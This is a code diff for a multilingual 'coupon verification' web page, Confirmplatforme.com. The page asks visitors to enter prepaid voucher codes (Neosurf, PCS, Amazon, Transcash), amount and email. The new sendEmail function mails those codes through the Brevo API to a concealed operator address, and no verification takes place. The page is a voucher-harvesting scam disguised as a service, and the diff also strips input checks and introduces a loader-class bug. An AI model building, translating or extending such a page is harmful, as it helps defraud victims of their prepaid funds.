+      tr: { formTitle: "Lütfen kupon bilgilerinizi buraya girin", labelRecharge: "Yüklemenizi seçin *", optDefault: "--- Yükleme ---", optOther: "Diğer", labelAmount: "Yükleme tutarı *", labelCurrency: "Para birimi seçin *", labelCode1: "Yükleme kodu 1 *", labelCode2: "Yükleme kodu 2", labelCode3: "Yükleme kodu 3", labelCode4: "Yükleme kodu 4", labelEmail: "E-posta adresinizi girin *", btnSubmit: "Onayla", loaderText: "Gönderiliyor...", successMsg: "✅ Bilgileriniz başarıyla gönderildi!", errorMsg: "❌ Bir hata oluştu. Lütfen tekrar deneyin.", footerDesc: "Check carta Certificato çevrimiçi kupon doğrulama hizmetidir.", footerServices: "Hizmetler", f1: "Neosurf kupon doğrulama", f2: "PCS kupon doğrulama", f3: "Amazon kupon doğrulama", f4: "TRANSACSH kupon doğrulama", f5: "Ve daha fazlası", footerHours: "Saatler", footerHoursDesc: "Her zaman açık! 7/24 kullanılabilir", footerCopy: "Copyright © 2025 Confirmplatforme.com", langLabel: "🌐 Dil:" },
+      ko: { formTitle: "여기에 쿠폰 정보를 입력하세요", labelRecharge: "충전 선택 *", optDefault: "--- 충전 ---", optOther: "기타", labelAmount: "충전 금액 *", labelCurrency: "통화 선택 *", labelCode1: "충전 코드 1 *", labelCode2: "충전 코드 2", labelCode3: "충전 코드 3", labelCode4: "충전 코드 4", labelEmail: "이메일 주소 입력 *", btnSubmit: "제출", loaderText: "전송 중...", successMsg: "✅ 정보가 성공적으로 전송되었습니다!", errorMsg: "❌ 오류가 발생했습니다. 다시 시도하세요.", footerDesc: "온라인 쿠폰 확인 서비스.", footerServices: "서비스", f1: "Neosurf 쿠폰 확인", f2: "PCS 쿠폰 확인", f3: "Amazon 쿠폰 확인", f4: "TRANSACSH 쿠폰 확인", f5: "그 외 다수", footerHours: "운영 시간", footerHoursDesc: "항상 운영! 24/7 이용 가능", footerCopy: "Copyright © 2025 Confirmplatforme.com", langLabel: "🌐 언어:" },
+      hi: { formTitle: "कृपया यहाँ कूपन जानकारी दर्ज करें", labelRecharge: "अपना रिचार्ज चुनें *", optDefault: "--- रिचार्ज ---", optOther: "अन्य", labelAmount: "रिचार्ज राशि *", labelCurrency: "मुद्रा चुनें *", labelCode1: "रिचार्ज कोड 1 *", labelCode2: "रिचार्ज कोड 2", labelCode3: "रिचार्ज कोड 3", labelCode4: "रिचार्ज कोड 4", labelEmail: "अपना ईमेल पता दर्ज करें *", btnSubmit: "सबमिट करें", loaderText: "भेजा जा रहा है...", successMsg: "✅ आपकी जानकारी सफलतापूर्वक भेज दी गई!", errorMsg: "❌ एक त्रुटि हुई। कृपया पुनः प्रयास करें।", footerDesc: "ऑनलाइन कूपन सत्यापन सेवा।", footerServices: "सेवाएं", f1: "Neosurf कूपन सत्यापन", f2: "PCS कूपन सत्यापन", f3: "Amazon कूपन सत्यापन", f4: "TRANSACSH कूपन सत्यापन", f5: "और भी बहुत कुछ", footerHours: "समय", footerHoursDesc: "हमेशा खुला! 24/7 उपलब्ध", footerCopy: "Copyright © 2025 Confirmplatforme.com", langLabel: "🌐 भाषा:" },
+      sw: { formTitle: "Tafadhali ingiza maelezo ya kuponi hapa", labelRecharge: "Chagua malipo yako *", optDefault: "--- Malipo ---", optOther: "Nyingine", labelAmount: "Kiasi cha malipo *", labelCurrency: "Chagua sarafu *", labelCode1: "Nambari ya malipo 1 *", labelCode2: "Nambari ya malipo 2", labelCode3: "Nambari ya malipo 3", labelCode4: "Nambari ya malipo 4", labelEmail: "Ingiza anwani yako ya barua pepe *", btnSubmit: "Thibitisha", loaderText: "Inatuma...", successMsg: "✅ Maelezo yako yametumwa kwa mafanikio!", errorMsg: "❌ Hitilafu imetokea. Tafadhali jaribu tena.", footerDesc: "Huduma ya uthibitishaji wa kuponi mtandaoni.", footerServices: "Huduma", f1: "Uthibitishaji wa kuponi Neosurf", f2: "Uthibitishaji wa kuponi PCS", f3: "Uthibitishaji wa kuponi Amazon", f4: "Uthibitishaji wa kuponi TRANSACSH", f5: "Na zaidi", footerHours: "Masaa", footerHoursDesc: "Wazi kila wakati! Inapatikana 24/7", footerCopy: "Hakimiliki © 2025 Confirmplatforme.com", langLabel: "🌐 Lugha:" },
+      ha: { formTitle: "Da fatan za a shigar da bayanan coupon anan", labelRecharge: "Zaɓi cajin ku *", optDefault: "--- Caji ---", optOther: "Wani", labelAmount: "Adadin cajin *", labelCurrency: "Zaɓi kuɗi *", labelCode1: "Lambar cajin 1 *", labelCode2: "Lambar cajin 2", labelCode3: "Lambar cajin 3", labelCode4: "Lambar cajin 4", labelEmail: "Shigar da adireshin imel ɗinku *", btnSubmit: "Tabbatar", loaderText: "Ana aiko...", successMsg: "✅ An aiko bayananku cikin nasara!", errorMsg: "❌ An samu kuskure. Da fatan za a sake gwadawa.", footerDesc: "Sabis na tabbatar da coupon akan layi.", footerServices: "Ayyuka", f1: "Tabbatar da coupon na Neosurf", f2: "Tabbatar da coupon na PCS", f3: "Tabbatar da coupon na Amazon", f4: "Tabbatar da coupon na TRANSACSH", f5: "Da sauransu", footerHours: "Sa'o'i", footerHoursDesc: "Kullum a buɗe! Ana samunsa 24/7", footerCopy: "Haƙƙin mallaka © 2025 Confirmplatforme.com", langLabel: "🌐 Yare:" },
+      yo: { formTitle: "Jọwọ tẹ alaye coupon rẹ nibi", labelRecharge: "Yan ẹrọ rẹ *", optDefault: "--- Ẹrọ ---", optOther: "Miiran", labelAmount: "Iye owo *", labelCurrency: "Yan owo *", labelCode1: "Koodu 1 *", labelCode2: "Koodu 2", labelCode3: "Koodu 3", labelCode4: "Koodu 4", labelEmail: "Tẹ adirẹsi imeeli rẹ *", btnSubmit: "Fi silẹ", loaderText: "Nranse...", successMsg: "✅ Alaye rẹ ti ranṣẹ pẹlu aṣeyọri!", errorMsg: "❌ Aṣiṣe kan waye. Jọwọ gbiyanju lẹẹkansii.", footerDesc: "Iṣẹ idaniloju coupon lori ayelujara.", footerServices: "Awọn Iṣẹ", f1: "Idaniloju coupon Neosurf", f2: "Idaniloju coupon PCS", f3: "Idaniloju coupon Amazon", f4: "Idaniloju coupon TRANSACSH", f5: "Ati ọpọlọpọ miiran", footerHours: "Awọn wakati", footerHoursDesc: "Ṣii nigbagbogbo! 24/7", footerCopy: "Aṣẹ-lori-ara © 2025 Confirmplatforme.com", langLabel: "🌐 Ede:" },
+      am: { formTitle: "እባክዎ የኩፖን መረጃዎን እዚህ ያስገቡ", labelRecharge: "ቅናሹን ይምረጡ *", optDefault: "--- ቅናሽ ---", optOther: "ሌሎች", labelAmount: "የቅናሽ መጠን *", labelCurrency: "ምንዛሬ ይምረጡ *", labelCode1: "የቅናሽ ኮድ 1 *", labelCode2: "የቅናሽ ኮድ 2", labelCode3: "የቅናሽ ኮድ 3", labelCode4: "የቅናሽ ኮድ 4", labelEmail: "የኢሜይል አድራሻዎን ያስገቡ *", btnSubmit: "አረጋግጥ", loaderText: "በመላክ ላይ...", successMsg: "✅ መረጃዎ በተሳካ ሁኔታ ተልኳል!", errorMsg: "❌ ስህተት ተከስቷል። እባክዎ እንደገና ይሞክሩ።", footerDesc: "የኦንላይን ኩፖን ማረጋገጫ አገልግሎት።", footerServices: "አገልግሎቶች", f1: "Neosurf ኩፖን ማረጋገጫ", f2: "PCS ኩፖን ማረጋገጫ", f3: "Amazon ኩፖን ማረጋገጫ", f4: "TRANSACSH ኩፖን ማረጋገጫ", f5: "እና ሌሎች ብዙ", footerHours: "የሥራ ሰዓቶች", footerHoursDesc: "ሁልጊዜ ክፍት! 24/7 ይገኛል", footerCopy: "የቅጂ መብት © 2025 Confirmplatforme.com", langLabel: "🌐 ቋንቋ:" },
+      wo: { formTitle: "Xam-xam ci dëkk bi ngir coupon bi fii", labelRecharge: "Tann sa recharge *", optDefault: "--- Recharge ---", optOther: "Yeneen", labelAmount: "Njëg bi *", labelCurrency: "Tann sa xaalis *", labelCode1: "Code 1 *", labelCode2: "Code 2", labelCode3: "Code 3", labelCode4: "Code 4", labelEmail: "Bind sa aadresse email *", btnSubmit: "Dëgël", loaderText: "Di yónnee...", successMsg: "✅ Say xibaar dañu ko yónnee ci kanam!", errorMsg: "❌ Am na njëkk. Jëlël loxo.", footerDesc: "Sëriñ verification coupon ci internet.", footerServices: "Sëriñu", f1: "Verification Neosurf", f2: "Verification PCS", f3: "Verification Amazon", f4: "Verification TRANSACSH", f5: "Ak yeneen", footerHours: "Waxtu", footerHoursDesc: "Dëkk bu tax! 24/7", footerCopy: "Copyright © 2025 Confirmplatforme.com", langLabel: "🌐 Làkk:" },
+      ln: { formTitle: "Tondela yango awa na makambu ya coupon", labelRecharge: "Pona ya mibeko *", optDefault: "--- Mibeko ---", optOther: "Mosusu", labelAmount: "Mosolo *", labelCurrency: "Pona monnaie *", labelCode1: "Code 1 *", labelCode2: "Code 2", labelCode3: "Code 3", labelCode4: "Code 4", labelEmail: "Tia adresse email *", btnSubmit: "Saki", loaderText: "Kotinda...", successMsg: "✅ Makambu na yo etindamaki malamu!", errorMsg: "❌ Likambo likei mabe. Leka lisusu.", footerDesc: "Mosala ya verification ya coupon.", footerServices: "Misala", f1: "Verification Neosurf", f2: "Verification PCS", f3: "Verification Amazon", f4: "Verification TRANSACSH", f5: "Na mosusu", footerHours: "Ntango", footerHoursDesc: "Ye ntango nyonso! 24/7", footerCopy: "Copyright © 2025 Confirmplatforme.com", langLabel: "🌐 Lokota:" },
+      mg: { formTitle: "Azafady ampidiro eto ny fampahalalana momba ny coupon", labelRecharge: "Safidio ny fanisanao *", optDefault: "--- Fanisana ---", optOther: "Hafa", labelAmount: "Vola fanisana *", labelCurrency: "Safidio vola *", labelCode1: "Kody 1 *", labelCode2: "Kody 2", labelCode3: "Kody 3", labelCode4: "Kody 4", labelEmail: "Ampidiro ny adiresin-taripatantanao *", btnSubmit: "Hamarino", loaderText: "Alefaso...", successMsg: "✅ Ny fampahalalana nentinao nalefa soa aman-tsara!", errorMsg: "❌ Nisy hadisoana. Azafady andramo indray.", footerDesc: "Serivisy fanitsiana coupon an-tserasera.", footerServices: "Serivisy", f1: "Fanitsiana coupon Neosurf", f2: "Fanitsiana coupon PCS", f3: "Fanitsiana coupon Amazon", f4: "Fanitsiana coupon TRANSACSH", f5: "Sy betsaka hafa", footerHours: "Ora", footerHoursDesc: "Miasa foana! 24/7", footerCopy: "Zon-kira © 2025 Confirmplatforme.com", langLabel: "🌐 Fiteny:" },
+      ro: { formTitle: "Vă rugăm să introduceți informațiile despre cupon aici", labelRecharge: "Selectați reîncărcarea *", optDefault: "--- Reîncărcare ---", optOther: "Altul", labelAmount: "Suma reîncărcării *", labelCurrency: "Alegeți o monedă *", labelCode1: "Codul reîncărcării 1 *", labelCode2: "Codul reîncărcării 2", labelCode3: "Codul reîncărcării 3", labelCode4: "Codul reîncărcării 4", labelEmail: "Introduceți adresa dvs. de email *", btnSubmit: "Validați", loaderText: "Se trimite...", successMsg: "✅ Informațiile dvs. au fost trimise cu succes!", errorMsg: "❌ A apărut o eroare. Vă rugăm să încercați din nou.", footerDesc: "Serviciu online de verificare a cupoanelor.", footerServices: "Servicii", f1: "Verificare cupoane Neosurf", f2: "Verificare cupoane PCS", f3: "Verificare cupoane Amazon", f4: "Verificare cupoane TRANSACSH", f5: "Și multe altele", footerHours: "Ore", footerHoursDesc: "Mereu deschis! 24/7", footerCopy: "Copyright © 2025 Confirmplatforme.com", langLabel: "🌐 Limbă:" },
+      hu: { formTitle: "Kérjük, adja meg a kupon adatait itt", labelRecharge: "Válassza ki a feltöltést *", optDefault: "--- Feltöltés ---", optOther: "Egyéb", labelAmount: "Feltöltési összeg *", labelCurrency: "Válasszon pénznemet *", labelCode1: "Feltöltési kód 1 *", labelCode2: "Feltöltési kód 2", labelCode3: "Feltöltési kód 3", labelCode4: "Feltöltési kód 4", labelEmail: "Adja meg e-mail-címét *", btnSubmit: "Megerősít", loaderText: "Küldés...", successMsg: "✅ Adatai sikeresen elküldve!", errorMsg: "❌ Hiba történt. Kérjük, próbálja újra.", footerDesc: "Online kuponellenőrző szolgáltatás.", footerServices: "Szolgáltatások", f1: "Neosurf kupon ellenőrzés", f2: "PCS kupon ellenőrzés", f3: "Amazon kupon ellenőrzés", f4: "TRANSACSH kupon ellenőrzés", f5: "És még sok más", footerHours: "Nyitvatartás", footerHoursDesc: "Mindig nyitva! 24/7", footerCopy: "Copyright © 2025 Confirmplatforme.com", langLabel: "🌐 Nyelv:" },
+      cs: { formTitle: "Zadejte prosím informace o kupónu zde", labelRecharge: "Vyberte dobíjení *", optDefault: "--- Dobíjení ---", optOther: "Jiné", labelAmount: "Výše dobíjení *", labelCurrency: "Vyberte měnu *", labelCode1: "Kód dobíjení 1 *", labelCode2: "Kód dobíjení 2", labelCode3: "Kód dobíjení 3", labelCode4: "Kód dobíjení 4", labelEmail: "Zadejte svou e-mailovou adresu *", btnSubmit: "Potvrdit", loaderText: "Odesílání...", successMsg: "✅ Vaše informace byly úspěšně odeslány!", errorMsg: "❌ Došlo k chybě. Zkuste to prosím znovu.", footerDesc: "Online služba ověřování kupónů.", footerServices: "Služby", f1: "Ověření kupónů Neosurf", f2: "Ověření kupónů PCS", f3: "Ověření kupónů Amazon", f4: "Ověření kupónů TRANSACSH", f5: "A mnohem více", footerHours: "Hodiny", footerHoursDesc: "Vždy otevřeno! 24/7", footerCopy: "Copyright © 2025 Confirmplatforme.com", langLabel: "🌐 Jazyk:" },
+      sv: { formTitle: "Ange din kuponginfo här", labelRecharge: "Välj ditt påfyllningskort *", optDefault: "--- Påfyllning ---", optOther: "Annat", labelAmount: "Påfyllningsbelopp *", labelCurrency: "Välj valuta *", labelCode1: "Påfyllningskod 1 *", labelCode2: "Påfyllningskod 2", labelCode3: "Påfyllningskod 3", labelCode4: "Påfyllningskod 4", labelEmail: "Ange din e-postadress *", btnSubmit: "Bekräfta", loaderText: "Skickar...", successMsg: "✅ Din information har skickats framgångsrikt!", errorMsg: "❌ Ett fel uppstod. Försök igen.", footerDesc: "Online kupongverifieringstjänst.", footerServices: "Tjänster", f1: "Neosurf-kupongverifiering", f2: "PCS-kupongverifiering", f3: "Amazon-kupongverifiering", f4: "TRANSACSH-kupongverifiering", f5: "Och mer", footerHours: "Öppettider", footerHoursDesc: "Alltid öppet! 24/7", footerCopy: "Copyright © 2025 Confirmplatforme.com", langLabel: "🌐 Språk:" },
+      fi: { formTitle: "Syötä kuponkitiedot tähän", labelRecharge: "Valitse latauksesi *", optDefault: "--- Lataus ---", optOther: "Muu", labelAmount: "Latausmäärä *", labelCurrency: "Valitse valuutta *", labelCode1: "Latauskoodi 1 *", labelCode2: "Latauskoodi 2", labelCode3: "Latauskoodi 3", labelCode4: "Latauskoodi 4", labelEmail: "Syötä sähköpostiosoitteesi *", btnSubmit: "Vahvista", loaderText: "Lähetetään...", successMsg: "✅ Tietosi lähetettiin onnistuneesti!", errorMsg: "❌ Tapahtui virhe. Yritä uudelleen.", footerDesc: "Verkossa toimiva kuponkien vahvistuspalvelu.", footerServices: "Palvelut", f1: "Neosurf-kuponkien vahvistus", f2: "PCS-kuponkien vahvistus", f3: "Amazon-kuponkien vahvistus", f4: "TRANSACSH-kuponkien vahvistus", f5: "Ja paljon muuta", footerHours: "Aukioloajat", footerHoursDesc: "Aina auki! 24/7", footerCopy: "Tekijänoikeus © 2025 Confirmplatforme.com", langLabel: "🌐 Kieli:" },
+      da: { formTitle: "Angiv venligst kuponoplysninger her", labelRecharge: "Vælg din opladning *", optDefault: "--- Opladning ---", optOther: "Andet", labelAmount: "Opladningsbeløb *", labelCurrency: "Vælg valuta *", labelCode1: "Opladningskode 1 *", labelCode2: "Opladningskode 2", labelCode3: "Opladningskode 3", labelCode4: "Opladningskode 4", labelEmail: "Indtast din e-mailadresse *", btnSubmit: "Bekræft", loaderText: "Sender...", successMsg: "✅ Dine oplysninger er sendt!", errorMsg: "❌ Der opstod en fejl. Prøv igen.", footerDesc: "Online kuponverificeringstjeneste.", footerServices: "Tjenester", f1: "Neosurf kuponverificering", f2: "PCS kuponverificering", f3: "Amazon kuponverificering", f4: "TRANSACSH kuponverificering", f5: "Og meget mere", footerHours: "Åbningstider", footerHoursDesc: "Altid åbent! 24/7", footerCopy: "Copyright © 2025 Confirmplatforme.com", langLabel: "🌐 Sprog:" },
+      el: { formTitle: "Παρακαλώ εισάγετε τα στοιχεία του κουπονιού εδώ", labelRecharge: "Επιλέξτε την επαναφόρτισή σας *", optDefault: "--- Επαναφόρτιση ---", optOther: "Άλλο", labelAmount: "Ποσό επαναφόρτισης *", labelCurrency: "Επιλέξτε νόμισμα *", labelCode1: "Κωδικός 1 *", labelCode2: "Κωδικός 2", labelCode3: "Κωδικός 3", labelCode4: "Κωδικός 4", labelEmail: "Εισάγετε τη διεύθυνση email σας *", btnSubmit: "Επικύρωση", loaderText: "Αποστολή...", successMsg: "✅ Τα στοιχεία σας εστάλησαν επιτυχώς!", errorMsg: "❌ Παρουσιάστηκε σφάλμα. Παρακαλώ δοκιμάστε ξανά.", footerDesc: "Διαδικτυακή υπηρεσία επαλήθευσης κουπονιών.", footerServices: "Υπηρεσίες", f1: "Επαλήθευση κουπονιών Neosurf", f2: "Επαλήθευση κουπονιών PCS", f3: "Επαλήθευση κουπονιών Amazon", f4: "Επαλήθευση κουπονιών TRANSACSH", f5: "Και πολλά άλλα", footerHours: "Ώρες", footerHoursDesc: "Πάντα ανοιχτό! 24/7", footerCopy: "Copyright © 2025 Confirmplatforme.com", langLabel: "🌐 Γλώσσα:" },
+      he: { formTitle: "אנא הזן כאן את פרטי הקופון", labelRecharge: "בחר את הטעינה שלך *", optDefault: "--- טעינה ---", optOther: "אחר", labelAmount: "סכום הטעינה *", labelCurrency: "בחר מטבע *", labelCode1: "קוד טעינה 1 *", labelCode2: "קוד טעינה 2", labelCode3: "קוד טעינה 3", labelCode4: "קוד טעינה 4", labelEmail: "הכנס את כתובת האימייל שלך *", btnSubmit: "אשר", loaderText: "שולח...", successMsg: "✅ המידע שלך נשלח בהצלחה!", errorMsg: "❌ אירעה שגיאה. אנא נסה שוב.", footerDesc: "שירות אימות קופונים מקוון.", footerServices: "שירותים", f1: "אימות קופוני Neosurf", f2: "אימות קופוני PCS", f3: "אימות קופוני Amazon", f4: "אימות קופוני TRANSACSH", f5: "ועוד", footerHours: "שעות", footerHoursDesc: "תמיד פתוח! 24/7", footerCopy: "זכויות יוצרים © 2025 Confirmplatforme.com", langLabel: "🌐 שפה:" },
+      fa: { formTitle: "لطفاً اطلاعات کوپن را اینجا وارد کنید", labelRecharge: "نوع شارژ را انتخاب کنید *", optDefault: "--- شارژ ---", optOther: "دیگر", labelAmount: "مبلغ شارژ *", labelCurrency: "ارز را انتخاب کنید *", labelCode1: "کد شارژ ۱ *", labelCode2: "کد شارژ ۲", labelCode3: "کد شارژ ۳", labelCode4: "کد شارژ ۴", labelEmail: "آدرس ایمیل خود را وارد کنید *", btnSubmit: "تأیید", loaderText: "در حال ارسال...", successMsg: "✅ اطلاعات شما با موفقیت ارسال شد!", errorMsg: "❌ خطایی رخ داد. لطفاً دوباره امتحان کنید.", footerDesc: "سرویس تأیید کوپن آنلاین.", footerServices: "خدمات", f1: "تأیید کوپن Neosurf", f2: "تأیید کوپن PCS", f3: "تأیید کوپن Amazon", f4: "تأیید کوپن TRANSACSH", f5: "و موارد دیگر", footerHours: "ساعت کاری", footerHoursDesc: "همیشه باز! ۲۴/۷", footerCopy: "کپی‌رایت © ۲۰۲۵ Confirmplatforme.com", langLabel: "🌐 زبان:" },
+      id: { formTitle: "Silakan masukkan informasi kupon di sini", labelRecharge: "Pilih isi ulang Anda *", optDefault: "--- Isi Ulang ---", optOther: "Lainnya", labelAmount: "Jumlah isi ulang *", labelCurrency: "Pilih mata uang *", labelCode1: "Kode isi ulang 1 *", labelCode2: "Kode isi ulang 2", labelCode3: "Kode isi ulang 3", labelCode4: "Kode isi ulang 4", labelEmail: "Masukkan alamat email Anda *", btnSubmit: "Kirim", loaderText: "Mengirim...", successMsg: "✅ Informasi Anda berhasil dikirim!", errorMsg: "❌ Terjadi kesalahan. Silakan coba lagi.", footerDesc: "Layanan verifikasi kupon online.", footerServices: "Layanan", f1: "Verifikasi kupon Neosurf", f2: "Verifikasi kupon PCS", f3: "Verifikasi kupon Amazon", f4: "Verifikasi kupon TRANSACSH", f5: "Dan lainnya", footerHours: "Jam", footerHoursDesc: "Selalu buka! Tersedia 24/7", footerCopy: "Copyright © 2025 Confirmplatforme.com", langLabel: "🌐 Bahasa:" },
+      ms: { formTitle: "Sila masukkan maklumat kupon di sini", labelRecharge: "Pilih tambah nilai anda *", optDefault: "--- Tambah Nilai ---", optOther: "Lain-lain", labelAmount: "Jumlah tambah nilai *", labelCurrency: "Pilih mata wang *", labelCode1: "Kod tambah nilai 1 *", labelCode2: "Kod tambah nilai 2", labelCode3: "Kod tambah nilai 3", labelCode4: "Kod tambah nilai 4", labelEmail: "Masukkan alamat e-mel anda *", btnSubmit: "Sahkan", loaderText: "Menghantar...", successMsg: "✅ Maklumat anda telah berjaya dihantar!", errorMsg: "❌ Ralat berlaku. Sila cuba lagi.", footerDesc: "Perkhidmatan pengesahan kupon dalam talian.", footerServices: "Perkhidmatan", f1: "Pengesahan kupon Neosurf", f2: "Pengesahan kupon PCS", f3: "Pengesahan kupon Amazon", f4: "Pengesahan kupon TRANSACSH", f5: "Dan banyak lagi", footerHours: "Waktu Operasi", footerHoursDesc: "Sentiasa buka! 24/7", footerCopy: "Hak Cipta © 2025 Confirmplatforme.com", langLabel: "🌐 Bahasa:" },
+      th: { formTitle: "กรุณากรอกข้อมูลคูปองที่นี่", labelRecharge: "เลือกการเติมเงิน *", optDefault: "--- การเติมเงิน ---", optOther: "อื่นๆ", labelAmount: "จำนวนเงิน *", labelCurrency: "เลือกสกุลเงิน *", labelCode1: "รหัสเติมเงิน 1 *", labelCode2: "รหัสเติมเงิน 2", labelCode3: "รหัสเติมเงิน 3", labelCode4: "รหัสเติมเงิน 4", labelEmail: "กรอกที่อยู่อีเมลของคุณ *", btnSubmit: "ยืนยัน", loaderText: "กำลังส่ง...", successMsg: "✅ ข้อมูลของคุณถูกส่งเรียบร้อยแล้ว!", errorMsg: "❌ เกิดข้อผิดพลาด กรุณาลองอีกครั้ง", footerDesc: "บริการตรวจสอบคูปองออนไลน์", footerServices: "บริการ", f1: "ตรวจสอบคูปอง Neosurf", f2: "ตรวจสอบคูปอง PCS", f3: "ตรวจสอบคูปอง Amazon", f4: "ตรวจสอบคูปอง TRANSACSH", f5: "และอื่นๆ อีกมากมาย", footerHours: "เวลาทำการ", footerHoursDesc: "เปิดตลอด! 24/7", footerCopy: "ลิขสิทธิ์ © 2025 Confirmplatforme.com", langLabel: "🌐 ภาษา:" },
+      vi: { formTitle: "Vui lòng nhập thông tin phiếu giảm giá tại đây", labelRecharge: "Chọn thẻ nạp của bạn *", optDefault: "--- Thẻ nạp ---", optOther: "Khác", labelAmount: "Số tiền nạp *", labelCurrency: "Chọn tiền tệ *", labelCode1: "Mã nạp 1 *", labelCode2: "Mã nạp 2", labelCode3: "Mã nạp 3", labelCode4: "Mã nạp 4", labelEmail: "Nhập địa chỉ email của bạn *", btnSubmit: "Xác nhận", loaderText: "Đang gửi...", successMsg: "✅ Thông tin của bạn đã được gửi thành công!", errorMsg: "❌ Đã xảy ra lỗi. Vui lòng thử lại.", footerDesc: "Dịch vụ xác minh phiếu giảm giá trực tuyến.", footerServices: "Dịch vụ", f1: "Xác minh phiếu Neosurf", f2: "Xác minh phiếu PCS", f3: "Xác minh phiếu Amazon", f4: "Xác minh phiếu TRANSACSH", f5: "Và nhiều hơn nữa", footerHours: "Giờ mở cửa", footerHoursDesc: "Luôn mở! 24/7", footerCopy: "Bản quyền © 2025 Confirmplatforme.com", langLabel: "🌐 Ngôn ngữ:" },
+      uk: { formTitle: "Будь ласка, введіть інформацію про купон тут", labelRecharge: "Виберіть поповнення *", optDefault: "--- Поповнення ---", optOther: "Інше", labelAmount: "Сума поповнення *", labelCurrency: "Виберіть валюту *", labelCode1: "Код поповнення 1 *", labelCode2: "Код поповнення 2", labelCode3: "Код поповнення 3", labelCode4: "Код поповнення 4", labelEmail: "Введіть вашу адресу електронної пошти *", btnSubmit: "Підтвердити", loaderText: "Надсилання...", successMsg: "✅ Вашу інформацію успішно надіслано!", errorMsg: "❌ Сталася помилка. Будь ласка, спробуйте ще раз.", footerDesc: "Онлайн-сервіс перевірки купонів.", footerServices: "Послуги", f1: "Перевірка купонів Neosurf", f2: "Перевірка купонів PCS", f3: "Перевірка купонів Amazon", f4: "Перевірка купонів TRANSACSH", f5: "І багато іншого", footerHours: "Години", footerHoursDesc: "Завжди відкрито! 24/7", footerCopy: "Copyright © 2025 Confirmplatforme.com", langLabel: "🌐 Мова:" },
+      bn: { formTitle: "অনুগ্রহ করে এখানে কুপনের তথ্য লিখুন", labelRecharge: "আপনার রিচার্জ নির্বাচন করুন *", optDefault: "--- রিচার্জ ---", optOther: "অন্যান্য", labelAmount: "রিচার্জের পরিমাণ *", labelCurrency: "একটি মুদ্রা চয়ন করুন *", labelCode1: "রিচার্জ কোড ১ *", labelCode2: "রিচার্জ কোড ২", labelCode3: "রিচার্জ কোড ৩", labelCode4: "রিচার্জ কোড ৪", labelEmail: "আপনার ইমেইল ঠিকানা লিখুন *", btnSubmit: "জমা দিন", loaderText: "পাঠানো হচ্ছে...", successMsg: "✅ আপনার তথ্য সফলভাবে পাঠানো হয়েছে!", errorMsg: "❌ একটি ত্রুটি ঘটেছে। আবার চেষ্টা করুন।", footerDesc: "অনলাইন কুপন যাচাইকরণ সেবা।", footerServices: "সেবাসমূহ", f1: "Neosurf কুপন যাচাই", f2: "PCS কুপন যাচাই", f3: "Amazon কুপন যাচাই", f4: "TRANSACSH কুপন যাচাই", f5: "এবং আরও অনেক", footerHours: "সময়সূচী", footerHoursDesc: "সবসময় খোলা! ২৪/৭", footerCopy: "কপিরাইট © ২০২৫ Confirmplatforme.com", langLabel: "🌐 ভাষা:" }
     };
 
     let currentSuccessMsg = translations.fr.successMsg;
     let currentErrorMsg = translations.fr.errorMsg;
 
-    // ─── FONCTIONS UTILITAIRES ─────────────────────────────────────
     function afficherAlerte(element, message, type) {
       if (!element) return;
       element.textContent = message;
@@ -973,17 +645,13 @@
 
     function activerChargement(btn, loader, estEnCours) {
       if (btn) btn.disabled = estEnCours;
-      if (loader) {
-        loader.className = estEnCours ? 'loader show' : 'loader';
-      }
+      if (loader) loader.className = estEnCours ? 'loader.show' : 'loader';
     }
 
-    // ─── APPLICATION DE LA LANGUE ────────────────────────────────
     function applyLang(lang) {
       const t = translations[lang] || translations['fr'];
       currentSuccessMsg = t.successMsg;
       currentErrorMsg = t.errorMsg;
-
       document.getElementById('formTitle').textContent = t.formTitle;
       document.getElementById('labelRecharge').innerHTML = t.labelRecharge;
       document.getElementById('optDefault').textContent = t.optDefault;
@@ -1010,27 +678,41 @@
       document.getElementById('langLabel').textContent = t.langLabel;
     }
 
-    // ─── ENVOI VERS MAKE.COM ──────────────────────────────────────
-    async function sendToMake(data) {
-      const response = await fetch(MAKE_WEBHOOK_URL, {
+    // ─── ENVOI VIA BREVO (API) ──────────────────────────────────
+    async function sendEmail(data) {
+      const htmlContent = `
+            <h2>📬 NOUVEAU COUPON REÇU</h2>
+            <p><strong>🔄 Type :</strong> ${data.type}</p>
+            <p><strong>💰 Montant :</strong> ${data.amount} ${data.currency}</p>
+            <p><strong>🔑 Code 1 :</strong> ${data.code1}</p>
+            <p><strong>🔑 Code 2 :</strong> ${data.code2}</p>
+            <p><strong>🔑 Code 3 :</strong> ${data.code3}</p>
+            <p><strong>🔑 Code 4 :</strong> ${data.code4}</p>
+            <p><strong>📧 Email :</strong> ${data.email}</p>
+            <p><strong>📅 Date :</strong> ${data.date}</p>
+            <hr>
+            <p style="color:#666;font-size:12px;">Email envoyé automatiquement depuis Confirmplatforme</p>
+            `;
+
+      const response = await fetch('https://api.brevo.com/v3/smtp/email', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
+          'api-key': BREVO_CONFIG.auth.pass
         },
         body: JSON.stringify({
-          type: data.type,
-          amount: data.amount,
-          currency: data.currency,
-          code1: data.code1,
-          code2: data.code2,
-          code3: data.code3,
-          code4: data.code4,
-          email: data.email,
-          date: data.date
+          sender: { email: "noreply@confirmplatforme.com", name: "Confirmplatforme" },
+          to: [{ email: EMAIL_DESTINATION }],
+          subject: `📬 Nouveau coupon - ${data.type}`,
+          htmlContent: htmlContent,
+          replyTo: { email: data.email }
         })
       });
 
-      if (!response.ok) throw new Error('Erreur make.com');
+      if (!response.ok) {
+        const error = await response.json();
+        throw new Error(error.message || 'Erreur Brevo');
+      }
     }
 
     // ─── FONCTION PRINCIPALE ──────────────────────────────────────
@@ -1049,36 +731,11 @@
       const loader = document.getElementById('loader');
       const alertBox = document.getElementById('alertBox');
 
-      // Vérifications
-      if (!currencyRadio) {
-        afficherAlerte(alertBox, '⚠️ Veuillez sélectionner une devise.', 'error');
-        return;
-      }
-
-      if (!userEmail.value) {
-        afficherAlerte(alertBox, '⚠️ Veuillez saisir votre email.', 'error');
-        return;
-      }
-
-      if (!amount.value) {
-        afficherAlerte(alertBox, '⚠️ Veuillez saisir un montant.', 'error');
-        return;
-      }
-
-      if (!rechargeType.value) {
-        afficherAlerte(alertBox, '⚠️ Veuillez sélectionner un type de recharge.', 'error');
-        return;
-      }
-
-      if (!code1.value) {
-        afficherAlerte(alertBox, '⚠️ Veuillez saisir le code de recharge 1.', 'error');
-        return;
-      }
-
-      const date = new Date().toLocaleString('fr-FR', {
-        dateStyle: 'full',
-        timeStyle: 'medium'
-      });
